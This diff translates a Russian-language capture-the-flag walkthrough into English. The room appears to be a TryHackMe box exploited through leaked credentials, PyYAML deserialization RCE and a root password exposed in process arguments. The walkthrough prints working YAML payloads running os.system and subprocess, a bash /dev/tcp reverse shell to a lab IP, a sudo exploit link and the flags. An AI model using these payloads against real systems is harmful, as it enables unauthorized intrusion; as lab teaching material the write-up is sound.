@@ -1,5 +1,5 @@
-**Теги**: Web, Boot2Root.
-**Сложность**: Easy.
+**Tags:** Web, Boot2Root.
+**Difficulty:** Easy.
 
 **IP:**
 
@@ -7,49 +7,49 @@
 10.113.161.208
 ```
 
-## 1. Поиск учётных данных в исходном коде
+## 1. Finding Credentials in the Source Code
 
-Начинаем с просмотра исходного кода веб-страницы. В комментарии обнаруживаем следующую запись:
+We begin by inspecting the source code of the web page. In a comment, we find the following:
 
 ```text
 staff note: the demo DJ login is still enabled for the soft opening.
 dj / dj  -- swap this before the season starts (ticket BAR-7)
 ```
 
-Из неё получаем тестовые учётные данные:
+From this, we obtain the test credentials:
 
 ```text
 Username: dj
 Password: dj
 ```
 
-На странице также обнаруживается перенаправление на:
+The page also contains a redirect to:
 
 ```text
 10.113.161.208/login
 ```
 
-Пробуем найденные credentials:
+We try the discovered credentials:
 
 ```text
 dj:dj
 ```
 
-Таким образом, первым способом доступа к приложению становится учётная запись DJ.
+This gives us our initial access to the application using the DJ account.
 
 ---
 
-## 2. Сканирование цели
+## 2. Scanning the Target
 
-После этого выполняем стандартное сканирование Nmap:
+We then perform a standard Nmap scan:
 
-```bash id="k0t6r5"
+```bash
 sudo nmap -sS -sV 10.113.161.208
 ```
 
-Вывод:
+Output:
 
-```text id="x7kq1v"
+```text
 [sudo] password for deb88:
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 07:50 EDT
 Nmap scan report for 10.113.161.208
@@ -61,24 +61,24 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Открыты два порта:
+Two ports are open:
 
 * `22/tcp` — SSH;
-* `80/tcp` — HTTP, работающий через Gunicorn.
+* `80/tcp` — HTTP running through Gunicorn.
 
 ---
 
-## 3. Перечисление веб-приложения
+## 3. Web Application Enumeration
 
-Проверяем веб-сервис с помощью Gobuster:
+We enumerate the web service using Gobuster:
 
-```bash id="5s2n0u"
+```bash
 gobuster dir -u 10.113.161.208 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
 ```
 
-Вывод:
+Output:
 
-```text id="r8xgkp"
+```text
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -101,23 +101,23 @@ Starting gobuster in directory enumeration mode
 Progress: 20481 / 20482 (100.00%)
 ```
 
-Интерес представляют `/dashboard`, `/export` и `/import`. Все они перенаправляют неавторизованного пользователя на `/login`.
+The interesting endpoints are `/dashboard`, `/export`, and `/import`. All of them redirect unauthenticated users to `/login`.
 
-Особенно важен `/import`, поскольку именно через импорт плейлиста далее обнаруживается уязвимость.
+The `/import` endpoint is particularly important because the playlist import functionality is where we later discover a vulnerability.
 
 ---
 
-# 4. Проверка SSH
+# 4. Testing SSH
 
-Так как Nmap обнаружил SSH, пробуем использовать найденную учётную запись:
+Since Nmap discovered SSH, we try using the credentials we found:
 
-```bash id="8qk4p3"
+```bash
 ssh dj@10.113.161.208
 ```
 
-После подтверждения host key:
+After accepting the host key:
 
-```text id="x4n8tc"
+```text
 The authenticity of host '10.113.161.208 (10.113.161.208)' can't be established.
 ED25519 key fingerprint is SHA256:JyEbNyMuqCQ6sokoHT+TTXoLujnwAQ6dbXhnypbTSPg.
 This key is not known by any other names.
@@ -126,23 +126,23 @@ Warning: Permanently added '10.113.161.208' (ED25519) to the list of known hosts
 dj@10.113.161.208: Permission denied (publickey).
 ```
 
-SSH не принимает парольную аутентификацию и требует public key:
+SSH does not accept password authentication and requires a public key:
 
 ```text
 Permission denied (publickey).
 ```
 
-Поэтому используем веб-приложение.
+Therefore, we continue through the web application.
 
 ---
 
-# 5. Анализ YAML-импорта
+# 5. Analyzing the YAML Import
 
-При исследовании функции импорта плейлиста выясняется, что приложение принимает YAML.
+While investigating the playlist import functionality, we discover that the application accepts YAML.
 
-Обычный файл выглядит следующим образом:
+A normal file looks like this:
 
-```yaml id="l3yr63"
+```yaml
 # Beach Bar jukebox playlist export
 playlist:
   name: Sunset Session
@@ -156,68 +156,68 @@ playlist:
       title: Locket
 ```
 
-Однако YAML можно модифицировать таким образом, чтобы PyYAML попытался обработать Python-объект:
+However, YAML can be modified so that PyYAML attempts to process a Python object:
 
-```yaml id="d5q7m8"
+```yaml
 artist: !!python/object/apply:os.system [id]
 ```
 
-При обработке такая конструкция действительно выполняется.
+When processed, the command is executed.
 
-В выводе появляется:
+The output contains:
 
 ```text
 0
 ```
 
-Значение `0` здесь является кодом возврата `os.system()`, то есть команда `id` была выполнена успешно.
+Here, `0` is the return code of `os.system()`, meaning that the `id` command was successfully executed.
 
 ---
 
-# 6. Подтверждение выполнения команд
+# 6. Confirming Command Execution
 
-Чтобы убедиться, что это не просто выполнение одной команды, пробуем использовать:
+To confirm that this is not limited to a single command, we try:
 
-```yaml id="q8c4p2"
+```yaml
 title: !!python/object/apply:subprocess.check_output
   - id
 ```
 
-В результате получаем:
+The result is:
 
-```text id="9v6h3m"
-'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'}
+```text
+'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'
 ```
 
-Это уже однозначно подтверждает выполнение команды на сервере.
+This definitively confirms command execution on the server.
 
-Команда выполняется от имени:
+The command runs as:
 
 ```text
 uid=1001(bartender)
 gid=1001(bartender)
 ```
 
-То есть веб-приложение позволяет выполнять произвольные команды с правами пользователя `bartender`.
+The web application therefore allows arbitrary commands to be executed with the privileges of the `bartender` user.
 
 ---
 
-# 7. Получение информации о директории приложения
+# 7. Getting Information About the Application Directory
 
-Используем `subprocess.check_output` для выполнения `ls -la`:
+We use `subprocess.check_output` to execute `ls -la`:
 
-```yaml id="d7z5q1"
+```yaml
 name: !!python/object/apply:subprocess.check_output
    - ["ls", "-la"]
 ```
 
-Получаем:
+We get:
 
-```text id="k1m4ps"
+```text
 {'playlist': {'name': b'total 24\ndrwxr-xr-x 4 bartender        bartender 4096 Jun 11 13:02 .\ndrwxr-xr-x 5 systemd-coredump ubuntu    4096 Jun 11 13:21 ..\ndrwxr-xr-x 2 bartender        bartender 4096 Jul 28 18:37 __pycache__\n-rw-r--r-- 1 bartender        bartender 2445 Jun 11 13:02 app.py\n-rw-r--r-- 1 bartender        bartender   44 Jun 11 10:47 requirements.txt\ndrwxr-xr-x 2 bartender        bartender 4096 Jun 11 10:47 templates\n', 'vibe': 'golden hour', 'tracks': [{'artist': 'Khruangbin', 'title': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'}, {'artist': 'Men I Trust', 'title': 'Show Me How'}, {'artist': 'Crumb', 'title': 'Locket'}]}}
 ```
 
-Из вывода становится известно содержимое директории приложения:
+We can now see the contents of the application directory:
 
 ```text
 __pycache__/
@@ -226,25 +226,25 @@ requirements.txt
 templates/
 ```
 
-Особенно интересен `requirements.txt`, поскольку он позволяет определить используемые версии Python-библиотек.
+The `requirements.txt` file is particularly interesting because it allows us to identify the versions of the Python libraries being used.
 
 ---
 
-# 8. Определение зависимостей приложения
+# 8. Identifying Application Dependencies
 
-Читаем `requirements.txt`:
+We read `requirements.txt`:
 
-```bash id="j4t6p9"
+```bash
 cat requirments.txt
 ```
 
-Получаем:
+We get:
 
-```text id="2n8xw4"
+```text
 'name': b'Flask==3.0.3\nPyYAML==6.0.2\ngunicorn==22.0.0\n',
 ```
 
-Таким образом, приложение использует:
+The application uses:
 
 ```text
 Flask==3.0.3
@@ -252,60 +252,60 @@ PyYAML==6.0.2
 gunicorn==22.0.0
 ```
 
-Ключевой компонент здесь — `PyYAML`, поскольку именно его небезопасная обработка YAML позволила использовать `!!python/object/apply`.
+The key component here is `PyYAML`, since its unsafe YAML processing allows us to use `!!python/object/apply`.
 
 ---
 
-# 9. Получение первого флага user.txt
+# 9. Getting the First `user.txt` Flag
 
-После подтверждения RCE используем тот же механизм для чтения файла пользователя:
+After confirming RCE, we use the same mechanism to read the user's file:
 
-```yaml id="p2k8w6"
+```yaml
 playlist:
   name: !!python/object/apply:subprocess.check_output
      - ["cat", "/home/bartender/user.txt"]
 ```
 
-В ответ получаем:
+The response contains:
 
-```text id="f3q9v1"
+```text
 THM{y4ml_pl4yl1st_pwns_th3_b34ch}
 ```
 
-### User flag
+### User Flag
 
-Таким образом, YAML-десериализация позволила выполнить команду `cat` и прочитать файл пользователя.
+The YAML deserialization vulnerability therefore allows us to execute `cat` and read the user's flag.
 
 ---
 
-# 10. Получение reverse shell
+# 10. Obtaining a Reverse Shell
 
-После получения RCE можно использовать его для получения интерактивного shell.
+Once RCE has been confirmed, we can use it to obtain an interactive shell.
 
-В качестве payload используется:
+The payload is:
 
-```yaml id="r6w1p8"
+```yaml
 # Beach Bar jukebox playlist export
 playlist:
   name: !!python/object/apply:os.system
      - bash -c "bash -i >& /dev/tcp/192.168.154.82/4444 0>&1"
 ```
 
-После успешного выполнения получаем shell и переходим в корневую директорию:
+After successful execution, we obtain a shell and move to the root directory:
 
-```bash id="c5v2n9"
+```bash
 cd /
 ```
 
-Проверяем содержимое:
+We check its contents:
 
-```bash id="u8k3r6"
+```bash
 ls -la
 ```
 
-Получаем:
+Output:
 
-```text id="m9p4s2"
+```text
 total 10512
 drwxr-xr-x  22 root root     4096 Aug  4 09:50 .
 drwxr-xr-x  22 root root     4096 Aug  4 09:50 ..
@@ -322,122 +322,121 @@ lrwxrwxrwx   1 root root        9 Oct 26  2020 lib32 -> usr/lib32
 lrwxrwxrwx   1 root root        9 Oct 26  2020 lib64 -> usr/lib64
 lrwxrwxrwx   1 root root       10 Oct 26  2020 libx32 -> usr/lib32
 drwx------   2 root root    16384 Oct 26  2020 lost+found
-drwxr-xr-x   2 root root     4096 Oct 26  09:50 media
-drwxr-xr-x   2 root root     4096 Aug  4 09:50 mnt
+drwxr-xr-x   1 root root     4096 Oct 26  09:50 media
+drwxr-xr-x   2 root root     4096 Aug  4  09:50 mnt
 drwxr-xr-x   3 root root     4096 Jun 11 10:49 opt
-dr-xr-xr-x 175 root root        0 Aug  4 09:50 proc
+dr-xr-xr-x 175 root root        0 Aug  4  09:50 proc
 drwx------   6 root root     4096 Jul 31 09:24 root
-drwxrwxrwt  11 root root     4096 Aug  4 10:51 tmp
-drwxr-xr-x  14 root root     4096 Aug  4 09:50 usr
+drwxrwxrwt  11 root root     4096 Aug  4  10:51 tmp
+drwxr-xr-x  14 root root     4096 Aug  4  09:50 usr
 drwxr-xr-x  13 root root     4096 Jul 28 18:42 var
 ```
 
-Это показывает файловую систему машины и наличие `/root`, `/opt`, `/home` и других стандартных директорий.
+This shows the filesystem of the machine, including `/root`, `/opt`, `/home`, and other standard directories.
 
 ---
 
-# 11. Локальное перечисление
+# 11. Local Enumeration
 
-На полученной машине запускаем `LinPEAS`.
+On the obtained machine, we run `LinPEAS`.
 
-Для этого сначала скачиваем его на машину с помощью Python HTTP-сервера, после чего запускаем из `/tmp`.
+We first download it to the machine using a Python HTTP server and then execute it from `/tmp`.
 
-Это стандартный этап локального enumeration после получения shell: проверяются права, процессы, конфигурационные файлы, credentials, SUID/SGID, sudo и другие потенциальные пути повышения привилегий.
+This is a standard local enumeration step after obtaining a shell. It checks permissions, processes, configuration files, credentials, SUID/SGID binaries, sudo, and other potential privilege escalation paths.
 
 ---
 
-# 12. Проверка версии sudo
+# 12. Checking the Sudo Version
 
-Также проверяем возможную локальную уязвимость sudo:
+We also check for a potential local sudo vulnerability:
 
-```text id="a6r4t9"
+```text
 https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh
 ```
 
-В логе отмечено, что версия sudo:
+The log shows that the sudo version is:
 
-```text id="q1s7e3"
+```text
 Sudo version 1.9.15p5
 ```
 
-подходит под рассматриваемый CVE, однако эксплуатация результата не дала.
+which matches the version range being investigated for the CVE. However, exploitation does not produce the desired result.
 
-Поэтому этот путь повышения привилегий не используется.
+Therefore, this privilege escalation path is not used.
 
 ---
 
-# 13. Поиск запущенного jukebox-сервиса
+# 13. Finding the Running Jukebox Service
 
-Далее проверяем процессы, связанные с jukebox:
+Next, we check for processes related to the jukebox:
 
-```bash id="n8f2w5"
+```bash
 ps aux | grep jukebox
 ```
 
-Получаем:
+We get:
 
-```text id="r5c9k2"
+```text
 root         609  0.0  0.2  20176 11780 ?        Ss   09:50   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
 bartend+   73758  0.0  0.0   7084  2236 pts/0    S+   11:35   0:00 grep --color=auto jukebox
 ```
 
-Здесь обнаруживается особенно важная информация.
+This reveals particularly important information.
 
-Процесс `jukeboxd.py` запущен от имени:
+The `jukeboxd.py` process is running as:
 
 ```text
 root
 ```
 
-и непосредственно в аргументах командной строки присутствует:
+and its command-line arguments contain:
 
 ```text
 --stream-pass SunsetSpritz2024!
 ```
 
-То есть пароль находится в открытом виде в списке процессов.
+The password is therefore exposed in plaintext in the process list.
 
 ---
 
-# 14. Повторное использование пароля
+# 14. Reusing the Password
 
-Пробуем использовать найденный пароль для перехода в `root`:
+We try using the discovered password to switch to `root`:
 
-```text id="w7m3q1"
+```text
 su root
 password: SunsetSpritz2024!
 ```
 
-
-Таким образом, повышение привилегий происходит не через CVE sudo, а из-за **повторного использования credentials**: пароль, который используется jukebox-сервисом, оказывается пригоден для учётной записи `root`.
+Privilege escalation succeeds due to **credential reuse**: the password used by the jukebox service is also valid for the `root` account.
 
 ---
 
-# 15. Получение root.txt
+# 15. Getting `root.txt`
 
-После перехода в `root` читаем:
+After switching to `root`, we read:
 
-```bash id="h2q6v8"
+```bash
 cat /root/root.txt
 ```
 
-Получаем:
+We get:
 
-```text id="p9x4s6"
+```text
 THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
 ```
 
 ---
 
-# Итоговая цепочка
+# Attack Chain
 
-Вся комната проходится по следующей цепочке:
+The complete room can be solved through the following chain:
 
 ```text
-Исходный код сайта
+Web page source
         │
         ▼
-Утёкшие credentials
+Leaked credentials
 dj:dj
         │
         ▼
@@ -447,7 +446,7 @@ Web login
 /import
         │
         ▼
-Небезопасная YAML-десериализация
+Unsafe YAML deserialization
 PyYAML !!python/object/apply
         │
         ▼
@@ -464,13 +463,13 @@ Arbitrary Command Execution
 Reverse Shell
         │
         ▼
-Shell пользователя bartender
+bartender shell
         │
         ▼
 ps aux | grep jukebox
         │
         ▼
-root-процесс раскрывает пароль
+Root process exposes password
 SunsetSpritz2024!
         │
         ▼
@@ -483,7 +482,7 @@ cat /root/root.txt
 THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
 ```
 
-### Флаги
+### Flags
 
 **User:**
 
@@ -497,5 +496,4 @@ THM{y4ml_pl4yl1st_pwns_th3_b34ch}
 THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
 ```
 
-Основные уязвимости комнаты — **оставленные тестовые credentials, небезопасная YAML-десериализация с RCE и повторное использование пароля root в конфигурации/аргументах запущенного сервиса**.
-
+The main vulnerabilities in the room are **leftover test credentials, unsafe YAML deserialization leading to RCE, and password reuse where the root password is exposed through the arguments of a running service**.
